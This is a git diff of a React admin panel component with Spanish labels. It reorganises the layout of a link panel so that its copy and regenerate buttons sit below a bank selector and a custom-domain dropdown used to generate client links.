@@ -914,23 +914,8 @@ export default function AdminPanel() {
         </div>
         
         {/* Link Panel */}
-        <div className="mx-4 md:mx-6 mt-6 bg-[#1e1e1e] p-3 md:p-4 rounded-lg flex flex-col md:flex-row gap-4 md:gap-0 md:justify-between md:items-center">
-          <div className="flex flex-col md:flex-row md:items-center gap-3 md:space-x-2">
-            {/* En móvil, botones de acción primero (encima de los enlaces) por solicitud del usuario */}
-            <div className="flex space-x-2 order-first mb-2 md:mb-0 md:order-last">
-              <button 
-                className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
-                onClick={copyLink}
-              >
-                Copiar
-              </button>
-              <button 
-                className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
-                onClick={() => generateLink.mutate()}
-              >
-                {generateLink.isPending ? 'Generando...' : 'Regenerar'}
-              </button>
-            </div>
+        <div className="mx-4 md:mx-6 mt-6 bg-[#1e1e1e] p-3 md:p-4 rounded-lg">
+          <div className="flex flex-col gap-4">
             
             {/* Selector de bancos arriba de dominios disponibles */}
             <div className="flex flex-col md:flex-row md:items-center gap-2 mb-4">
@@ -975,41 +960,57 @@ export default function AdminPanel() {
             
             <div className="flex flex-col md:flex-row md:items-center gap-2">
               <span className="font-semibold">Dominios disponibles:</span>
+              <select 
+                className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-1 text-sm"
+                value={selectedDomainId || ''}
+                onChange={(e) => setSelectedDomainId(e.target.value ? parseInt(e.target.value) : null)}
+              >
+                <option value="">Seleccionar dominio...</option>
+                {customDomains
+                  .filter((domain: any) => domain.isActive)
+                  .map((domain: any) => (
+                    <option key={domain.id} value={domain.id}>
+                      {domain.name} ({domain.domain})
+                    </option>
+                  ))
+                }
+              </select>
+            </div>
+            
+            {/* Botones y enlace debajo de banco y dominios */}
+            <div className="flex flex-col gap-3">
               <div className="flex items-center gap-2">
-                <select 
-                  className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-1 text-sm"
-                  value={selectedDomainId || ''}
-                  onChange={(e) => setSelectedDomainId(e.target.value ? parseInt(e.target.value) : null)}
+                <button 
+                  className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                  onClick={copyLink}
                 >
-                  <option value="">Seleccionar dominio...</option>
-                  {customDomains
-                    .filter((domain: any) => domain.isActive)
-                    .map((domain: any) => (
-                      <option key={domain.id} value={domain.id}>
-                        {domain.name} ({domain.domain})
-                      </option>
-                    ))
-                  }
-                </select>
+                  Copiar
+                </button>
+                <button 
+                  className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                  onClick={() => generateLink.mutate()}
+                >
+                  {generateLink.isPending ? 'Generando...' : 'Regenerar'}
+                </button>
                 <button 
                   className="text-xs text-white bg-[#007bff] hover:bg-blue-700 px-3 py-1 rounded disabled:opacity-50"
                   onClick={() => selectedDomainId && regenerateLinkWithDomain(selectedDomainId)}
                   disabled={!selectedDomainId}
                 >
-                  Regenerar
+                  Regenerar con dominio
                 </button>
               </div>
               
-              
-              
               {clientLink && (
-                <a 
-                  href={clientLink} 
-                  target="_blank" 
-                  className="text-[#00aaff] text-sm md:text-base truncate max-w-[140px] md:max-w-[200px] lg:max-w-none"
-                >
-                  {clientLink}
-                </a>
+                <div className="flex items-center">
+                  <a 
+                    href={clientLink} 
+                    target="_blank" 
+                    className="text-[#00aaff] text-sm md:text-base truncate"
+                  >
+                    {clientLink}
+                  </a>
+                </div>
               )}
             </div>
             
